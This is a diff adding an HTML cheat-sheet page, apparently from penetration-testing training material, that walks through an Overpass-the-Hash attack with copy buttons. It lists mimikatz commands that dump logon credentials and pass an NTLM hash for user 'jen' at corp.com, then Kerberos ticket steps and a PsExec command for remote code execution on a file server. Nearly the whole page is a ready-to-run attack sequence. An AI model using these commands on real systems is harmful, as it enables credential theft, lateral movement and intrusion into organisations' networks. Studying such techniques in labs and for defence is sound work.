@@ -1,0 +1,75 @@
+<section class="page active prose-page">
+  <h1>mimikatz + psexec</h1>
+
+  <p class="intro">
+    Overpass-the-Hash upgrades a stolen NTLM hash into a Kerberos Ticket Granting Ticket (TGT). Mimikatz loads the hash
+    into a new logon session, a domain action triggers issuance of a TGT, and PsExec then reuses the resulting Kerberos
+    tickets to gain remote code execution as the target user without performing NTLM authentication over the network.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Dump The User's Hash Use Mimikatz</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">privilege::debug</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">sekurlsa::logonpasswords</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Create A New Process In The User's Context</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Generate The TGT</h2>
+    <span></span>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Authenticate To A Network SPN</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">net use \\files04</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Verify Cached Tickets</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">klist</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Remote Code Execution With PsExec</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">.\PsExec.exe \\files04 cmd</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
